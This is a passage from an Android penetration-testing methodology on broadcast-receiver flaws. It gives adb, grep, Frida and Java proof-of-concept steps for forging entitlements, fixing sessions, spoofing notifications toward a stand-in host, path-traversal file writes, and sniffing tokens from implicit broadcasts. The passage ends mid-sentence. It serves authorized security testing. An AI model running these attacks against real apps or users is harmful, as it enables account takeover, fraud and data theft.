  release build (`grep -rn 'BuildConfig' out/sources/com/target/app/BuildConfig.java`). Read the release
  `BuildConfig`, do not assume it.

### D05-015 · Receiver that flips entitlement, subscription or premium state

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); if the entitlement is honoured server-side, argue up on the business impact |
| **Attacker** | AM-03 |
| **Applies to** | Apps with paid tiers, feature gating, trial state or a licence check. |
| **Maps to** | MASTG-TEST-0366, MASWE-0018 |

- **Test:** Broadcast the app's own entitlement-change signal with a premium payload and see whether the
  client unlocks. Then answer the question that decides severity: does the **server** honour it, or does
  the next API call re-assert the real tier?
- **How:**
```bash
grep -rnE 'PREMIUM|isPro|entitlement|subscription|tier|licen[cs]e|SUBSCRIPTION_CHANGED' out/sources/ \
  | grep -iE 'receiver|onReceive|sendBroadcast'
adb shell am broadcast -n com.target.app/.StateReceiver \
  -a com.target.app.SUBSCRIPTION_CHANGED --es tier premium --ez active true
```
  Then exercise a paid feature and watch the network:
```bash
adb logcat -c && adb shell monkey -p com.target.app 1   # drive the paid screen, capture in Burp
```
- **Proof:** Screenshot of the unlocked feature **plus** the API response proving the server also served
  premium content (a 200 with the gated payload). A client-only unlock with a 403 on the next call is a
  client-side-only control — still reportable, but Medium and framed honestly as a client-side gate, not
  as revenue loss.
- **Escalation:** → D15 if the client sends the forged tier to the backend and the backend trusts it
  (that is mass assignment via a mobile channel). → D23 entitlement fraud.
- **Ruled out when:** The entitlement is re-fetched from the server on every gated action and the client
  flag is display-only — demonstrate with the 403/entitlement-refresh response, not by reading the code.

### D05-016 · Receiver that terminates, rotates or fixates the session

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) if you can set the session rather than only clear it |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | MASTG-TEST-0366, MASWE-0018, ATT&CK T1624.001 |

- **Test:** Two different bugs hide behind "logout receiver". Clearing the session from any app is a
  nuisance-grade availability issue. **Setting** it — a receiver that accepts a token, account id or
  refresh token extra and stores it — is session fixation and rates far higher.
- **How:**
```bash
grep -rnE 'extends BroadcastReceiver' -A60 out/sources/ | \
  grep -nE 'logout|signOut|clearSession|setToken|saveToken|refreshToken|setAccount|switchUser'
adb shell am broadcast -n com.target.app/.LogoutReceiver -a com.target.app.LOGOUT
adb shell am broadcast -n com.target.app/.AuthReceiver -a com.target.app.SET_SESSION \
  --es token "zq7x4mk9.attacker.jwt" --es accountId "9999"
adb shell run-as com.target.app cat shared_prefs/*.xml | grep -i 'token\|session\|account'
```
- **Proof:** For fixation: the attacker-supplied token present in the app's own session store and the app's
  next request carrying it. For termination: the session actually ending with the app in the background and
  your broadcast as the only trigger.
- **Escalation:** Fixation → D13: the victim then operates inside the attacker's account, or the attacker
  reads the victim's activity from the account they control.
- **Ruled out when:** The receiver only reads and never writes auth state, or every write path validates
  the token's signature and account binding against the server before storage. A pure logout receiver with
  no write path is a documented Low/graveyard entry, not a finding.

### D05-017 · Receiver that renders an attacker-supplied notification or in-app message

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `server_side_injection.content_spoofing.external_authentication_injection` (P4) only if a triager insists on the spoofing framing — argue up with credential capture |
| **Attacker** | AM-03 |
| **Applies to** | All apps with a notification or in-app-message pipeline driven by a broadcast. |
| **Maps to** | H1 #97295 (ok.ru — forged private message attributed to a real account), H1 #394332 (VK, Low), MASWE-0018 |

- **Test:** A receiver whose extras drive notification title, body, image URL or deep link lets any app
  impersonate the vendor **inside the vendor's own trusted UI**. A toast is Low; a message that appears to
  come from a real contact, or a security alert that leads to a credential prompt, is the impact to argue.
- **How:**
```java
Intent u = new Intent("com.target.app.action.NOTIFY");
u.setPackage("com.target.app");
u.putExtra("key", "d-147298617");
u.putExtra("title", "Your account is locked");
u.putExtra("message", "Confirm your password to restore access");
u.putExtra("image", "https://zq7x4mk9.collab.example/x.png");
u.putExtra("deeplink", "targetapp://web?url=https://zq7x4mk9.collab.example/login");
sendBroadcast(u);
```
```bash
adb shell am broadcast -a com.target.app.action.NOTIFY -p com.target.app \
  --es title "Your account is locked" --es image "https://zq7x4mk9.collab.example/x.png"
```
- **Proof:** A screenshot of the victim app displaying a message no user sent, attributed to a real
  account or to the vendor. The stronger proof is the app fetching **your** image URL — that shows a
  zero-`INTERNET` app just made a network request through the victim, which is the framing that got the VK
  report accepted.
- **Escalation:** Socially engineer the forged notification into a credential prompt (D04 UI redress) or
  into a deep link that lands in a WebView (D09 → D10).
- **Ruled out when:** The notification pipeline takes its content only from an authenticated server fetch
  keyed on a server-issued id, and the receiver's extras are used solely as a cache key that is validated
  against that fetch. Show the fetch.

### D05-018 · Receiver guarded by a squattable or non-signature custom permission

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) plus `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All. `<receiver android:permission="X">` is only as strong as X's *enforced* protection level, and an orphaned or first-declarer-wins custom permission is no guard at all (see D03). |
| **Maps to** | `developer.android.com/training/permissions/restrict-interactions`; `developer.android.com/privacy-and-security/risks/custom-permissions` |

- **Test:** Resolve every `android:permission` on a receiver to its **declared protection level on the
  device**, not to the string in the manifest. A `normal` or `dangerous` level means any app can hold it; an
  orphaned permission (referenced but never declared) means the guard silently does nothing.
- **How:**
```bash
grep -n -B2 -A8 '<receiver' out/AndroidManifest.xml | grep -E 'android:permission|android:name'
grep -n '<permission ' out/AndroidManifest.xml
adb shell pm list permissions -f -d | grep -A4 'com.target.permission'
# then declare it in the attacker app and check it was granted
adb shell dumpsys package com.poc.zeroperm | grep -A20 'install permissions'
adb shell am broadcast -a com.target.action.X -p com.target.app
```
- **Proof:** `pm list permissions -f` showing `protectionLevel: normal` (or the permission absent
  entirely), the attacker package's `install permissions` block showing it granted, and the receiver's
  handler effect produced from that package.
- **Escalation:** Same chain as the unguarded receiver — whatever D05-013 to D05-017 the handler reaches.
- **Ruled out when:** `pm list permissions -f` reports `protectionLevel: signature` (or
  `signatureOrSystem`) for the permission **and** it is declared by the target app itself, so the
  first-declarer race does not apply. Paste the `pm list permissions` output into the ruled-out entry.

### D05-019 · Broadcast sent with a `receiverPermission` that is not signature level

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | QARK `BROADCAST_WITH_RECEIVER` ("may still be vulnerable to interception, if the protection level of the permission is not set to signature or signatureOrSystem"); QARK `BROADCAST_WITH_RECEIVER_UNDER_21` (LEGACY pre-API-21 squatting window) |

- **Test:** The subtle sibling of D05-030. The developer *did* pass a receiver permission to
  `sendBroadcast(intent, permission)` — but its protection level is `normal` or `dangerous`, so any app
  declares it, is auto-granted, and receives the extras. The guard reads as present in code review and is
  cosmetic in practice.
- **How:**
```bash
grep -rnE 'send(Ordered)?Broadcast(AsUser)?\([^,]+,\s*[^,)]+\)' out/sources/
# resolve each permission name that turns up
adb shell pm list permissions -f -d | grep -A4 '<the.permission.name>'
```
  Attacker side: declare `<uses-permission android:name="the.permission.name"/>`, install, confirm the
  grant, register the receiver, log the extras.
- **Proof:** The attacker app's `install permissions` block showing the permission auto-granted, plus its
  receiver logging the victim's extras.
- **Escalation:** Same as D05-030 — rate on the payload.
- **Ruled out when:** Every `sendBroadcast(intent, permission)` call site names a permission that resolves
  to `signature`/`signatureOrSystem` and is declared by the app itself.

### D05-020 · Receiver makes a trust decision with no caller identity at all

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null), CWE-925 |
| **Attacker** | AM-03 |
| **Applies to** | All. `BroadcastReceiver.getSentFromUid()` / `getSentFromPackage()` exist only from **API 34**, and only return a value when the sender opted in with `BroadcastOptions.setShareIdentityEnabled(true)`. Below 34 there is no caller identity in a broadcast at all. |
| **Maps to** | `developer.android.com/privacy-and-security/risks/sender-of-pending-intents`; Google security-tips "Perform input validation in intent receivers"; CWE-925 |

- **Test:** Find receivers that branch on something they treat as proof of sender identity — a
  `"sender"`/`"from_package"` extra, a `PendingIntent` creator lookup, or nothing at all — and show the
  branch is forgeable. `PendingIntent.getCreator*()` returns the **creator**, not the sender, so a receiver
  using it for authentication is authenticating the wrong party.
- **How:**
```bash
grep -rn 'getSentFromUid\|getSentFromPackage\|setShareIdentityEnabled' out/sources/
grep -rn 'extends BroadcastReceiver' -A40 out/sources/ | \
  grep -nE 'getCallingUid|checkCallingPermission|getCreatorPackage|getCreatorUid|getStringExtra\("(sender|from|package|caller)"'
# forge whatever the branch reads
adb shell am broadcast -n com.target.app/.TrustReceiver -a com.target.app.TRUSTED \
  --es sender com.target.app --es caller_uid 10123
```
- **Proof:** The forged broadcast processed identically to a legitimate one — same state change, no
  rejection in logcat — from a package whose real identity does not match the forged extra.
- **Escalation:** Whatever the "trusted" path does; often D08 when the trusted path is the one allowed to
  hand over an Intent.
- **Ruled out when:** The receiver performs no trust decision (all inputs treated as untrusted and
  validated), **or** it calls `getSentFromUid()` on API 34+ and rejects unknown UIDs, **or** the sensitive
  path is on a Binder/Service route where `Binder.getCallingUid()` is authoritative. Note explicitly that
  `getSentFromUid()` is not available below API 34, so a pre-34 app cannot use this defence.

### D05-021 · Weak receiver challenge-response seeded from wall-clock time

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) if the guarded action is authentication |
| **Attacker** | AM-03 |
| **Applies to** | Apps (commonly OEM/preinstalled) that guard an exported receiver with a broadcast challenge/response rather than a permission. |
| **Maps to** | HackTricks `android-applications-basics` ("Weak receiver challenge-response and crash-to-restart primitives") |

- **Test:** Where a receiver expects a `VERIFY_*` / `AUTH_*` token returned on a second broadcast within a
  30-60 second window, check how the challenge is generated. A static or process-scoped
  `new Random(System.currentTimeMillis())` makes the secret brute-forceable inside a seed window you can
  narrow by forcing a process restart.
- **How:**
```bash
grep -rnE 'new Random\(|SecureRandom|System\.currentTimeMillis\(\)|nanoTime\(\)' out/sources/ -B4 -A4 \
  | grep -iE 'random|seed|challenge|verify|token'
grep -rnE 'VERIFY|CHALLENGE|AUTH_TOKEN' out/sources/ | grep -i receiver
# 1) force a process restart with a crash primitive (see D04), note the wall-clock time
adb shell am start -n com.target.app/.ExportedActivity
date +%s%3N
# 2) enumerate candidate seeds around that millisecond and replay the response
adb shell am broadcast -n com.target.app/.AuthReceiver -a com.target.VERIFY --el token <candidate>
```
- **Proof:** The guarded action executing after you replay a computed token, with no legitimate pairing
  having taken place — and the seed-window arithmetic in the report (candidate count, hit index).
- **Escalation:** The classic two-component chain: DoS in component A forces the RNG reseed, auth bypass in
  component B follows. File the crash primitive and the bypass as separate reports (see D05-060).
- **Ruled out when:** The challenge comes from `SecureRandom` with no wall-clock seeding, or the response
  is verified server-side, or the window is bound to a value the attacker cannot observe. Show the
  generator's construction.

### D05-022 · AppWidgetProvider receiver custom actions — exported by construction

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Any app shipping a home-screen widget. An `AppWidgetProvider` **is** a `BroadcastReceiver` and **must** be `android:exported="true"` for the system to drive it — so its custom actions are open to every app by construction, not by mistake. |
| **Maps to** | `developer.android.com/develop/ui/views/appwidgets`; `developer.android.com/privacy-and-security/risks/insecure-broadcast-receiver`; MASWE-0018 |

- **Test:** Widget providers routinely cache a session token to render "logged-in" content and expose
  custom refresh/action strings that nobody authenticates. Enumerate the provider's actions beyond
  `APPWIDGET_UPDATE` and fire each with attacker extras.
- **How:**
```bash
grep -nB2 -A12 'android.appwidget.action.APPWIDGET_UPDATE' out/AndroidManifest.xml
grep -rnE 'extends AppWidgetProvider' -A80 out/sources/ | grep -nE 'intent\.getAction\(\)|equals\("'
adb shell dumpsys appwidget | grep -i target -A10
adb shell am broadcast -n com.target.app/.MyWidgetProvider \
  -a com.target.app.widget.ACTION_REFRESH --es token "zq7x4mk9" --ei appWidgetId 1
```
- **Proof:** The widget code path executing with your extras — an outbound request carrying
  `token=zq7x4mk9`, or `dumpsys appwidget` showing the widget's state changed.
- **Escalation:** Join with D08: collection widgets use one template `PendingIntent` plus a per-item
  `fillInIntent`; if the template leaves the component unset, the fill-in supplies it, and widget item data
  frequently originates from server content.
- **Ruled out when:** The provider handles only `APPWIDGET_UPDATE`/`APPWIDGET_DELETED` and derives all
  content from an authenticated fetch, ignoring every extra except `appWidgetIds` — which it validates
  against `AppWidgetManager.getAppWidgetIds()` for its own provider.

### D05-023 · `DownloadManager` completion receivers that trust `EXTRA_DOWNLOAD_ID`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `server_side_injection.remote_code_execution_rce` (P1) is the band you are aiming at if the handler loads the referenced file |
| **Attacker** | AM-03 |
| **Applies to** | All. The receiver must be `exported="false"` or permission-guarded at any targetSdk — the implicit-export default only helps from targetSdk 31. |
| **Maps to** | `developer.android.com/reference/android/app/DownloadManager` (`ACTION_DOWNLOAD_COMPLETE`, `ACTION_NOTIFICATION_CLICKED`, `COLUMN_LOCAL_URI`) |

- **Test:** Apps that use `DownloadManager` register for `ACTION_DOWNLOAD_COMPLETE` and then act on the
  completed file — install it, import it, decrypt it, parse it, mark an update applied. The broadcast
  carries only an id. If the receiver is reachable and the id is not checked against the app's own enqueue
  table, you point the handler at a download it never made.
- **How:**
```bash
grep -nE 'android.intent.action.DOWNLOAD_COMPLETE|DOWNLOAD_NOTIFICATION_CLICKED' out/AndroidManifest.xml
grep -rnE 'ACTION_DOWNLOAD_COMPLETE|EXTRA_DOWNLOAD_ID|DownloadManager\.Query|COLUMN_LOCAL_URI' out/sources/
adb shell am broadcast -a android.intent.action.DOWNLOAD_COMPLETE \
  -n com.target.app/.download.DownloadCompleteReceiver --el extra_download_id 1
```
- **Proof:** The post-download handler running on an id the app never enqueued — logcat showing the
  install/import/verify path, or the app displaying "update ready" for a download that does not exist. The
  strong proof is the handler reading `COLUMN_LOCAL_URI` for a download **you** enqueued and processing
  your bytes under the app's UID.
- **Escalation:** → D17 (dynamic code loading / update verification) and D16 (native parser) when the
  handler loads or parses the file.
- **Ruled out when:** `DownloadManager.query` is UID-scoped so the victim's query for your id returns an
  empty cursor and the handler no-ops — this is a real and common negative; record the empty-cursor
  observation, not just the code path. Also ruled out when the receiver is `exported="false"` and no
  runtime twin exists.

### D05-024 · Boot / package-replaced receiver that reads configuration from a writable location

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); chain to `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the injected config redirects credentialed traffic |
| **Attacker** | AM-03 / AM-04 (storage) |
| **Applies to** | All. `BOOT_COMPLETED` remains manifest-registrable and `RECEIVE_BOOT_COMPLETED` is a normal permission. Most other implicit system broadcasts are not manifest-registrable from API 26. |
| **Maps to** | ATT&CK T1624.001 (Broadcast Receivers — BOOT_COMPLETED named first, used by EventBot, FakeSpy, SimBad), T1398, T1603 |

- **Test:** Auto-start paths run before any user is present, which is exactly when nobody is watching. Does
  the boot/`MY_PACKAGE_REPLACED` handler read a file another app or the user can write — external storage,
  a MediaStore path, a world-readable cache?
- **How:**
```bash
grep -nE 'BOOT_COMPLETED|LOCKED_BOOT_COMPLETED|MY_PACKAGE_REPLACED|USER_PRESENT|ACTION_POWER_CONNECTED' \
  out/AndroidManifest.xml
grep -rnE 'BootReceiver|onReceive' -A30 out/sources/ | \
  grep -nE 'getExternalFilesDir|getExternalStorageDirectory|/sdcard|FileInputStream|MediaStore'
# plant, then trigger
adb shell "echo '{\"base_url\":\"https://zq7x4mk9.collab.example/\"}' > /sdcard/Android/data/com.target.app/files/config.json"
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED -n com.target.app/.BootReceiver
adb logcat -d | grep -i zq7x4mk9
```
- **Proof:** The app consuming your planted value after the boot broadcast — a connection to your host in
  Burp or a DNS log, with the marker in the hostname.
- **Escalation:** Attacker-controlled config at boot plus a code loader is the full persistence chain →
  D17. Combine with D05-054 (restricted bucket) for the "and now the security control never re-arms" half.
- **Ruled out when:** The boot handler reads only from `getFilesDir()` / `getNoBackupFilesDir()` and no
  external or shared path feeds it, **and** the values it reads are re-validated against the server before
  use. Quote the path construction.

### D05-025 · FCM / c2dm push receiver reachable locally

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All apps using FCM or a third-party push SDK. A correct implementation guards the receiver with the `com.google.android.c2dm.permission.SEND` signature permission and declares the messaging service `exported="false"`; an unprotected one is the finding. |
| **Maps to** | MASWE-0018; `developer.android.com/privacy-and-security/risks/insecure-broadcast-receiver` |

- **Test:** Push payloads routinely drive deep-link navigation, WebView loads, silent sync or config
  changes. If the legacy `com.google.android.c2dm.intent.RECEIVE` receiver (or the app's own push receiver)
  is reachable locally, a zero-permission app forges pushes without ever touching the FCM server key.
- **How:**
```bash
grep -nB2 -A8 'com.google.firebase.MESSAGING_EVENT\|com.google.android.c2dm.intent.RECEIVE' out/AndroidManifest.xml
grep -rnE 'FirebaseMessagingService|onMessageReceived|RemoteMessage|getData\(\)\.get\(' out/sources/ -A8
adb shell am broadcast -a com.google.android.c2dm.intent.RECEIVE \
  -n com.target.app/com.google.firebase.iid.FirebaseInstanceIdReceiver \
  --es deeplink "targetapp://web?url=https://zq7x4mk9.collab.example/" \
  --es url "https://zq7x4mk9.collab.example/"
run app.broadcast.sniff --action com.google.android.c2dm.intent.RECEIVE
```
  Hook the handler to see the parsed payload:
```js
Java.perform(function () {
  var S = Java.use('com.google.firebase.messaging.FirebaseMessagingService');
  S.onMessageReceived.implementation = function (m) {
    console.log('[onMessageReceived] from=' + m.getFrom() + ' data=' + m.getData());
    return this.onMessageReceived(m);
  };
});
```
- **Proof:** The app following your injected deep link or loading your URL from a broadcast that never came
  from Google — recorded with the marker in the host. Alternatively, the sniffer capturing a real push
  whose payload carries an OTP or message body.
- **Escalation:** → D09 (deep link) → D10 (WebView) → D24 (the push channel itself, including a recovered
  server key which turns AM-03 into AM-01).
- **Ruled out when:** The receiver carries `android:permission="com.google.android.c2dm.permission.SEND"`
  (resolved to signature level and held only by Google Play services) and the messaging service is
  `exported="false"` — confirm with `dumpsys package` that the receiver's permission is enforced, then show
  the `SecurityException` your send produced.

### D05-026 · Receiver that hands attacker input to a deferred `WorkManager` / `JobScheduler` / `AlarmManager` job

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | ATT&CK T1603 (Scheduled Task/Job — "WorkManager was introduced to unify task scheduling on Android, using JobScheduler, GcmNetworkManager, and AlarmManager internally"), T1624.001 |

- **Test:** Deferred execution hides the trigger from both the tester and the user: the broadcast lands
  now, the privileged work happens twenty minutes later, and nothing in the UI connects them. Check whether
  receiver extras reach `setInputData` or a job's persisted extras.
- **How:**
```bash
grep -rnE 'WorkManager|OneTimeWorkRequest|PeriodicWorkRequest|setInputData|JobScheduler|JobInfo\.Builder|AlarmManager|setExactAndAllowWhileIdle' out/sources/ -B10 \
  | grep -i receiver
adb shell am broadcast -n com.target.app/.SyncReceiver -a com.target.app.SCHEDULE \
  --es url "https://zq7x4mk9.collab.example/" --el delay 0
UID=$(adb shell dumpsys package com.target.app | grep -m1 userId= | tr -dc '0-9')
adb shell dumpsys jobscheduler | sed -n "/$UID/,+30p"
adb shell dumpsys alarm | grep -A5 com.target.app
```
- **Proof:** `dumpsys jobscheduler` (or `dumpsys alarm`) showing a pending job for the package carrying your
  marker in its extras, followed by the job firing and performing the action — the Collaborator hit
  timestamped well after the broadcast.
- **Escalation:** Deferred plus boot-persistent plus a code loader is the full persistence chain → D17.
- **Ruled out when:** Job input data is constructed entirely from app state with no path from an Intent
  extra, or the job re-validates every input against the server before acting. Trace the `Data.Builder`
  arguments.

### D05-027 · Reading any single extra deserialises the whole Bundle

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `server_side_injection.remote_code_execution_rce` (P1) is the band a proven gadget chain reaches |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | MASWE-0050 (CWE-20, CWE-345); the Play Core analysis ("attackers create malicious Parcelable objects containing code executed during deserialization via the `createFromParcel()` method") |

- **Test:** A component that never references your malicious key still instantiates your
  `Serializable`/`Parcelable` gadget the moment it touches the Bundle. "It does not read that key" is not a
  mitigation — the unmarshalling happens for the whole Bundle.
- **How:**
```bash
grep -rn 'getSerializableExtra\|getParcelableExtra\|readSerializable\|ObjectInputStream\|createFromParcel\|CREATOR' out/sources/ \
  | grep -viE '^out/sources/(android|androidx|kotlin)/' | head -60
```
  Check whether the class read back is resolved **by name from the Intent** (classloader-controlled) rather
  than as a fixed type. Then send a gadget class present in the app's own dependency set alongside the key
  the receiver does read, and hook the gadget:
```js
Java.perform(function () {
  var G = Java.use('com.somedep.GadgetClass');
  G.$init.overloads.forEach(function (o) {
    o.implementation = function () { console.log('[REACHED] gadget constructed'); return o.apply(this, arguments); };
  });
});
```
- **Proof:** A Frida `[REACHED]` line, or a stack trace showing the gadget class being constructed inside
  the victim's process from your broadcast.
- **Escalation:** → D17 gadget chains and dynamic code loading.
- **Ruled out when:** You enumerated the app's dependency set and found no deserialisation gadget reachable
  from a Bundle — record that as a verified negative in the same terms ("no deserialization sink"), naming
  what you searched. A crash alone with no gadget is `application_level_denial_of_service_dos.app_crash.malformed_android_intents`
  (P5) — graveyard, not a finding.

### D05-028 · Receiver that forwards a nested Intent — the redirection sink discovered in D05

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) / `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | CWE-926; Oversecured TikTok analysis (`com.ss.android.ugc.awemepushlib.receiver.NotificationBroadcastReceiver`); `developer.android.com/privacy-and-security/risks/intent-redirection` |

- **Test:** Receivers are the most commonly forgotten intent-redirection sink. Any `onReceive` that pulls a
  `Parcelable` Intent out of its own extras and starts it hands your Intent the victim's UID.
- **How:** jadx query inside `onReceive` for this shape:
```java
Intent intent2 = (Intent) intent.getParcelableExtra("contentIntentURI");
if ("notification_clicked".equals(action)) { context.startActivity(intent2); }
```
```bash
grep -rn 'extends BroadcastReceiver' -A60 out/sources/ | \
  grep -nE 'getParcelableExtra\(.*Intent|startActivity\(|startService\(|sendBroadcast\(|Intent\.parseUri'
# also check for the grant flags being carried through
grep -rn 'FLAG_GRANT_READ_URI_PERMISSION\|FLAG_GRANT_WRITE_URI_PERMISSION\|FLAG_GRANT_PERSISTABLE_URI_PERMISSION\|FLAG_GRANT_PREFIX_URI_PERMISSION' out/sources/
```
- **Proof:** A non-exported activity of the target app launching when you broadcast a crafted Parcelable —
  `adb shell dumpsys activity activities | grep -m1 topResumedActivity` shows it resumed, started by the
  victim's own UID.
- **Escalation:** This is a D08 finding found in D05 — file it there and cross-reference. The highest-value
  variant is a `content://` URI with `FLAG_GRANT_READ_URI_PERMISSION` pointed at the attacker's own
  component, which self-grants read access to the victim's private files (see D05-051).
- **Ruled out when:** Every forwarded Intent is passed through a component allow-list or
  `androidx.core.content.IntentSanitizer` that strips `FLAG_GRANT_*` and constrains scheme and component —
  and you have confirmed the sanitiser runs on **every** call site, not just the first one you found.

### D05-029 · Receiver that copies files from caller-supplied URIs (the Play Core / SmartSwitch shape)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `server_side_injection.remote_code_execution_rce` (P1) is the band the full chain reaches |
| **Attacker** | AM-03 |
| **Applies to** | Any app bundling `com.google.android.play:core` below **1.7.2** (CVE-2020-8913), and any SDK with a restore/import receiver taking URI arrays. The monolithic `com.google.android.play:core` was deprecated in April 2022 and receives no further fixes — an app still on the monolith is unpatched against anything found since. |
| **Maps to** | CVE-2020-8913; MASWE-0050 (CWE-22, CWE-73) |

- **Test:** A receiver that copies content from URIs supplied in an extra into the app's own data
  directory, with the destination filename taken from another extra, is an arbitrary-file-write primitive
  in the victim's sandbox. Play Core's version copied from `split_file_intents` into
  `files/splitcompat/<id>/unverified-splits/` under the name `split_id`, with no traversal check — and a
  file named `config.*` in `verified-splits/` is added to the runtime ClassLoader automatically.
- **How:**
```bash
grep -rn "com.google.android.play:core" --include='*.gradle*' --include='*.toml' .
unzip -p base.apk 'META-INF/*.version' | sort -u | grep -i play
grep -rn "com/google/android/play/core/splitcompat\|SplitCompat\|SplitInstallUpdateIntentService\|split_file_intents\|unverified-splits" out/sources/
# the receiver only exists while the app is foregrounded (registered at runtime)
adb shell am start -n com.target.app/.MainActivity
adb shell am broadcast \
  -a com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService \
  -p com.target.app --es split_id "../verified-splits/config.test"
adb shell run-as com.target.app ls -l files/splitcompat/*/verified-splits/
# the generalised SDK shape
adb shell am broadcast -n com.target.app/com.vendor.sdk.SomeReceiver -a com.vendor.ACTION_RESTORE \
  --esa SAVE_URI_PATHS "content://com.poc.zeroperm.fp/document/data%2F..%2F..%2Ffiles%2Fpwn.so"
```
- **Proof:** `run-as` (or a read-back through the app's own FileProvider) showing a file **you** wrote at a
  path **you** chose inside the victim's data directory. For the full chain, your payload's marker in
  logcat under the **target's** pid (`adb shell pidof com.target.app`, then `adb logcat --pid=<pid>`).
- **Escalation:** File write into `files/`, `code_cache/` or a splitcompat verified directory → loaded code
  → D17. Code execution as the app then reads the Keystore-wrapped material in-process, all
  SharedPreferences and the WebView cookie database.
- **Ruled out when:** The bundled Play Core version is 1.7.2 or later (or the app has migrated to the split
  `app-update`/`feature-delivery` artefacts), and no other receiver in the app copies from a caller-supplied
  URI to a caller-supplied filename. Paste the version from `META-INF/*.version`.

### D05-030 · Implicit broadcast carrying a session token, OTP or credential

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) for the token once you replay it; `broken_access_control.exposed_sensitive_android_intent` (null) for the mechanism; `broken_authentication_and_session_management.two_fa_bypass` (**P3**) for an intercepted OTP, `authentication_bypass` (**P1**) with full takeover |
| **Attacker** | AM-03 |
| **Applies to** | All. The three documented controls are a permission on `sendBroadcast`, `setPackage(String)` (API 14+), or `exported="false"` on the receiving side. |
| **Maps to** | MASTG-TEST-0374 (References to Implicit Intents Carrying Sensitive Extras), MASTG-TECH-0164 (Sniffing Implicit Intents and Broadcasts), MASWE-0032, MASTG-KNOW-0025, MASTG-BEST-0056, rule `mastg-android-implicit-intent-leaking-extras`, MASTG-TOOL-0110, MASTG-TOOL-0015; CWE-927; ATT&CK T1635, T1533; H1 #56002, #185862, #192886, #167481 |

- **Test:** The flagship item of the domain. `sendBroadcast(new Intent("com.target.app.TOKEN_REFRESHED")
  .putExtra("token", jwt))` with no receiver permission and no `setPackage` is delivered to every matching
  receiver on the device. Documented verbatim by the platform: "Don't broadcast sensitive information using
  an implicit intent. Any app can read the information if it registers to receive the broadcast."
- **How:**
```bash
# static: sends with no target and no permission
grep -rnE 'sendBroadcast\(|sendOrderedBroadcast\(|sendStickyBroadcast\(' out/sources/ \
  | grep -vE 'setPackage|setComponent|setClass|LocalBroadcastManager'
# recover the action strings even on an obfuscated build
grep -rnE 'const-string.*"com\.target\.app\.[A-Z_]+"' out/smali/ | head
semgrep -c rules/mastg-android-implicit-intent-leaking-extras.yml out/sources/
```
  In-process hook, which catches sends whose action you could not recover statically:
```js
Java.perform(function () {
  var Ctx = Java.use('android.app.ContextImpl');   // concrete; android.content.Context is abstract
  ['sendBroadcast','sendStickyBroadcast','sendOrderedBroadcast'].forEach(function (m) {
    if (!Ctx[m]) return;
    Ctx[m].overloads.forEach(function (o) {
      o.implementation = function () {
        var i = arguments[0];
        console.log('[' + m + '] ' + i.toString());
        var b = i.getExtras();
        if (b !== null) { var it = b.keySet().iterator();
          while (it.hasNext()) { var k = it.next(); console.log('   ' + k + ' = ' + b.get(k)); } }
        return o.apply(this, arguments);
      };
    });
  });
});
```
  Attacker side — a runtime-registered receiver in the zero-permission APK (use runtime registration, not
  the manifest, so the API 26 manifest restriction never applies):
```java
IntentFilter f = new IntentFilter("com.target.app.TOKEN_REFRESHED");
f.setPriority(999);
registerReceiver(new BroadcastReceiver() {
  public void onReceive(Context c, Intent i) {
    for (String k : i.getExtras().keySet())
      Log.e("PoC", k + " = " + i.getExtras().get(k));
  }}, f, Context.RECEIVER_EXPORTED);   // the flag is mandatory at targetSdk 34+, including for your PoC
```
```bash
adb logcat -s PoC:E
run app.broadcast.sniff --action com.target.app.TOKEN_REFRESHED
```
- **Proof:** Two artefacts, in this order. (1) Your PoC app's logcat line printing the actual token value,
  captured under **your** package's UID with no permissions declared. (2) The same token replayed against
  the API returning 200 with the victim's data. The second is what moves the filing from
  `exposed_sensitive_android_intent` (null) to `disclosure_of_secrets.for_publicly_accessible_asset` (P1).
  Leave the JSON key names and your own attacker UID visible in the evidence; mask the token body.
- **Escalation:** → D13/D15 account takeover. An intercepted OTP is a direct 2FA bypass.
- **Ruled out when:** Every `sendBroadcast` call site either passes a signature-level receiver permission,
